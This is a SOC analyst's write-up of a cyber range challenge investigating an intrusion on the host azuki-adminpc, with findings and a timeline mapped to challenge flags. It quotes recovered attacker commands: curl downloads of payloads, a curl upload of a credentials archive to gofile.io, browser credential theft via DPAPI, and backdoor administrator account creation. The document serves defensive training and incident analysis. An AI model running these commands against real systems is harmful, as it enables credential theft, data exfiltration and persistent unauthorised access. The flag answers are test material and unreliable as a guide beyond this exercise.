# SOC Incident Investigation – Azuki Import/Export Compromise Part 3

<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/b5e3098f-2401-4d02-888c-e32bee920d4b" />

**Analyst:** Luka Groff

**Source:** Cyber Range SOC Challenge

**System:** azuki-adminpc

---

## Overview
Five days after the file server breach, threat actors returned with sophisticated tools and techniques. The attacker pivoted from the compromised workstation to the CEO's administrative PC, deploying persistent backdoors and exfiltrating sensitive business data including financial records and password databases.

---

## Key Findings

### Lateral Movement
- Source IP: `10.1.0.204`
- Compromised User: `yuki.tanaka`
- Device: `azuki-adminpc`

### Execution
- Payload Hosting Service: `litter.catbox.moe`
- Malware Download Command: `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`
- Archive Extraction Command: `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`

### Discovery
- Session Enumeration: `qwinsta.exe`
- Domain Trust Enumeration: `"nltest.exe" /domain_trusts /all_trusts`
- Network Connection Enumeration: `"NETSTAT.EXE" -ano`
- Password Database Search: `where /r C:\Users *.kdbx`
- Credential File Discovered: `OLD-Passwords.txt`

### Persistence
- C2 Implant: `meterpreter.exe`
- Named Pipe: `\Device\NamedPipe\msf-pipe-5902`
- Backdoor Account: `yuki.tanaka2`
- Privilege Escalation Command: `net localgroup Administrators yuki.tanaka2 /add`

### Credential Access
- Account Creation Command: `net user yuki.tanaka2 B@ckd00r2024! /add`
- Credential Theft Tool Download: `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`
- Browser Credential Theft Command: `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`
- Master Password Extraction file: `KeePass-Master-Password.txt`

### Collection
- Data Staging Directory: `C:\ProgramData\Microsoft\Crypto\staging`
- Automated Data Collection Command: `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`
- Exfiltration Volume - number of archives created: `8`

### Exfiltration
- Data Upload Command: `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`
- Cloud Storage Service: `gofile.io`
- Destination Server IP: `45.112.123.227`

---

## Full Timeline

| Time (UTC) | Flag |	Stage	| Event / Artifact |
|------------|-------|-------|-----------------|
| 04:06:41 |	**Flag 1,2,3** |	Lateral Movement |	Source IP → 10.1.0.204; Target AccName/Device → yuki.tanaka, azuki-adminpc |
| 04:08:58 |	**Flag 12** |	Discovery |	Session Enumeration command → qwinsta.exe |
| 04:09:25 |	**Flag 13** |	Discovery |	Domain Trust Enumeration → "nltest.exe" /domain_trusts /all_trusts |
| 04:10:07 |	**Flag 14** |	Discovery |	Network Connection Enumeration → "NETSTAT.EXE" -ano |
| 04:13:45 |	**Flag 15** |	Discovery |	Password Database Search → where /r C:\Users *.kdbx |
| 04:15:52 |	**Flag 16** |	Discovery |	Credential File → OLD-Passwords.txt |
| 04:21:12 |	**Flag 4,5** |	Execution |	Malware Download Command & Hosting Service → "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z hxxps[://]litter[.]catbox[.]moe/gfdb9v[.]7z & litter.catbox.moe |
| 04:21:32 |	**Flag 6** |	Execution |	Archive Extraction Command → "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y |
| 04:21:33 |	**Flag 7** |	Persistence |	C2 Implant → meterpreter.exe |
| 04:24:35 |	**Flag 8** |	Persistence |	Named Pipe → \Device\NamedPipe\msf-pipe-5902 |
| 04:28:09 |	**Flag 17** |	Collection |	Data Staging Directory → C:\ProgramData\Microsoft\Crypto\staging |
| 04:37:03 |	**Flag 18** |	Collection |	Automated Data Collection Command → "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP |
| 04:37:33 → 04:40:30 |	**Flag 19** |	Collection |	Exfiltration Volume → 8 |
| 04:39:16 |	**Flag 25** |	Credential Access |	Master Password Extraction → KeePass-Master-Password.txt |
| 04:41:51 |	**Flag 22,23** |	Exfiltration |	Data Upload Command & Cloud Storage Service → "curl.exe" -X POST -F file=@credentials.tar.gz hxxps[://]store1[.]gofile[.]io/uploadFile & gofile.io |
| 04:41:52 |	**Flag 24** |	Exfiltration |	Destination Server IP → 45.112.123.227 |
| 04:51:08 |	**Flag 9,10** |	Credential Access & Persistence |	Account Creation command & account created → net user yuki.tanaka2 B@ckd00r2024! /add& yuki.tanaka2 |
| 04:51:23 |	**Flag 11** |	Persistence |	Privilege Escalation Command → net localgroup Administrators yuki.tanaka2 /add |
| 05:55:34 |	**Flag 20** |	Credential Access |	Credential Theft Tool Download → "curl.exe" -L -o m-temp.7z hxxps[://]litter[.]catbox[.]moe/mt97cj[.]7z |
| 05:55:54 |	**Flag 21** |	Credential Access |	Browser Credential Theft  → "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit |

---

